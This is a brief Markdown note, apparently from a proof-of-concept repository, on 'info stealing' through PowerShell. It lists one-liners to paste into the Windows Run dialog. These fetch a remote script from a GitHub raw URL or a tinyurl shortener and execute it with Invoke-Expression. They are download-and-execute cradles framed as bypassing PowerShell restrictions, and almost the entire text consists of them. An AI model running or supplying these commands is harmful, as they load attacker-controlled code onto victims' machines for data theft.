# Info Stealing via PowerShell command

## ByPass PowerShell restriction

Using "run" application to run powershell command inline:

    - powershell Write-Host "Test"; Start-Sleep -Seconds 1
    - powershell $rawcmd = Invoke-webrequest -URI https://raw.githubusercontent.com/roccosicilia/my-papers/main/poc-c2/infosteal-ps/cmd-demo.txt; Invoke-Expression $rawcmd;
    - powershell $rawcmd = Invoke-webrequest -URI https://tinyurl.com/3v7pdjj9; Invoke-Expression $rawcmd;
    - powershell $rawcmd = Invoke-webrequest -URI https://tinyurl.com/3v7pdjj9 -UseBasicParsing; Invoke-Expression $rawcmd;
